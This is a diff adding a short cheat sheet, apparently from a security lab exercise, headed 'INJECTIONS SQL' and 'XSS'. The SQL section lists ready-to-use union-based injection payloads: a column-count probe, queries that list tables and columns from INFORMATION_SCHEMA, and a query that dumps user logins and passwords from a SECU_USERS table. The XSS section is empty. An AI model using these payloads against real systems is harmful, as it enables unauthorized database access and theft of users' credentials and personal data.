@@ -1,0 +1,16 @@
+
+##################################
+# INJECTIONS SQL
+##################################
+
+Exploitation
+
+' ORDER BY 8 -- %20
+' UNION SELECT null,TABLE_NAME,TABLE_TYPE,null,null,null FROM INFORMATION_SCHEMA.TABLES --%20
+' UNION SELECT null,COLUMN_NAME,null,null,null,null FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='SECU_USERS
+' UNION SELECT null,USR_LOGIN,CONCAT(USR_PWD, ' ', USR_VILLE, '  ', USR_AGE, 'ans'),null,null,null FROM SECU_USERS -- %20
+
+
+##################################
+# XSS
+##################################
